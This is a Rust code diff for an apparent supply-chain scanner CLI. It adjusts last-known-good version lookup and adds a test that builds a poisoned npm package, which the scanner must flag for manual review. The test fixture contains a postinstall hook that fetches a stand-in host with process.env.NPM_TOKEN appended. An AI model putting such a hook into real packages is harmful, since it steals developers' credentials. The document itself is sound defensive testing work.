@@ -12849,13 +12849,16 @@ fn find_last_known_good<'a>(
         )
     });
     if subject.pinned {
-        candidates.into_iter().find(|record| {
+        let exact_match = candidates.iter().position(|record| {
             record.artifact_hash == subject.artifact_hash
                 || record
                     .resolved_version
                     .as_deref()
                     .is_some_and(|version| Some(version) == subject.resolved_version.as_deref())
-        })
+        });
+        exact_match
+            .and_then(|index| candidates.get(index).copied())
+            .or_else(|| candidates.into_iter().next())
     } else {
         candidates.into_iter().next()
     }
@@ -20458,6 +20461,111 @@ exit 0
         assert!(result.output.contains("network_capability_observed"));
         assert!(!result.output.contains("NPM_TOKEN_VALUE"));
         assert!(!result.output.contains("/Users/"));
+
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn package_risk_detects_poisoned_pinned_update_against_last_known_good() {
+        let root = temp_root("whoathere-cli-package-risk-poisoned-update");
+        let state_dir = root.join("state");
+        let baseline = root.join("baseline");
+        let poisoned = root.join("poisoned");
+        let baseline_scanner = root.join("baseline-scanner.json");
+        let poisoned_scanner = root.join("poisoned-scanner.json");
+        std::fs::create_dir_all(&baseline).expect("baseline");
+        write_new_file(
+            &baseline.join("package.json"),
+            br#"{
+  "name": "popular-clean-package",
+  "version": "1.0.0",
+  "whoatherePublishedAtUnixSeconds": 1700000000,
+  "private": true
+}
+"#,
+        )
+        .expect("baseline package");
+        write_scanner_run_receipt(&baseline_scanner, Some(&state_dir), &baseline, true, &[]);
+
+        let baseline_assessed = evaluate_command(Command::PackageRiskAssess {
+            workspace: Some(baseline.display().to_string()),
+            ecosystem: Some("npm".to_string()),
+            state_dir: Some(state_dir.display().to_string()),
+            scanner_receipt: Some(baseline_scanner.display().to_string()),
+            ai_review: false,
+            ai_provider: None,
+            ai_model: None,
+            ai_timeout_seconds: None,
+            json: true,
+        });
+        assert_eq!(baseline_assessed.exit_code, 0);
+        assert!(baseline_assessed
+            .output
+            .contains("\"overall_verdict\": \"auto_sync_candidate\""));
+        let receipt = single_package_risk_receipt(&state_dir);
+        let approved = evaluate_command(Command::PackageRiskApprove {
+            receipt: Some(receipt.display().to_string()),
+            reason: Some("clean maintainer baseline".to_string()),
+            state_dir: Some(state_dir.display().to_string()),
+            json: true,
+        });
+        assert_eq!(approved.exit_code, 0);
+
+        std::fs::create_dir_all(&poisoned).expect("poisoned");
+        write_new_file(
+            &poisoned.join("package.json"),
+            br#"{
+  "name": "popular-clean-package",
+  "version": "1.0.1",
+  "whoatherePublishedAtUnixSeconds": 1700000000,
+  "private": true,
+  "scripts": {"postinstall": "node postinstall.js"}
+}
+"#,
+        )
+        .expect("poisoned package");
+        write_new_file(
+            &poisoned.join("postinstall.js"),
+            b"fetch('https://example.invalid/collect?token=' + process.env.NPM_TOKEN)\n",
+        )
+        .expect("postinstall");
+        write_scanner_run_receipt(&poisoned_scanner, Some(&state_dir), &poisoned, true, &[]);
+
+        let poisoned_assessed = evaluate_command(Command::PackageRiskAssess {
+            workspace: Some(poisoned.display().to_string()),
+            ecosystem: Some("npm".to_string()),
+            state_dir: Some(state_dir.display().to_string()),
+            scanner_receipt: Some(poisoned_scanner.display().to_string()),
+            ai_review: false,
+            ai_provider: None,
+            ai_model: None,
+            ai_timeout_seconds: None,
+            json: true,
+        });
+        assert_eq!(poisoned_assessed.exit_code, 22);
+        assert!(poisoned_assessed
+            .output
+            .contains("\"overall_verdict\": \"manual_review\""));
+        assert!(poisoned_assessed
+            .output
+            .contains("\"last_known_good_version\": \"1.0.0\""));
+        assert!(poisoned_assessed
+            .output
+            .contains("known_good_diff_suspicious"));
+        assert!(poisoned_assessed
+            .output
+            .contains("npm_lifecycle_script_postinstall"));
+        assert!(poisoned_assessed
+            .output
+            .contains("credential_or_environment_access"));
+        assert!(poisoned_assessed
+            .output
+            .contains("network_capability_observed"));
+        assert!(poisoned_assessed
+            .output
+            .contains("Package code was not run on the host"));
+        assert!(!poisoned_assessed.output.contains("NPM_TOKEN_VALUE"));
+        assert!(!poisoned_assessed.output.contains("/Users/"));
 
         let _ = std::fs::remove_dir_all(&root);
     }
